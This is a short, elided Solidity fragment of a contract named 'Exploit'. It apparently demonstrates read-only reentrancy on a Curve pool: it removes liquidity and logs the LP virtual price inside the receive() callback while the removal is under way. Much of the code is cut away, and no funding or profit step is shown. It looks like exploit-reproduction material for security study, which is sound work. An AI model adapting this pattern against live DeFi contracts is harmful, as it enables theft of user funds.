...
contract Exploit {
    ...
    function manipulateCurvePool() public {
        ...
        console.log(
            "LP token price before removing liquidity:",
    ...
    function removeLiquidity() public {
        ...
        curvePool.remove_liquidity(
            lpBalance - 3000000000000000001,
            min_amounts
        ); // Removing liquidity

        console.log(
            "LP token price after2 removing liquidity:",
            curvePool.get_virtual_price()
        );
    }
    ...
    receive() external payable {
        if (msg.sender == address(curvePool)) {
            console.log(
                "LP token price during removing liquidity:",
                curvePool.get_virtual_price()
            );
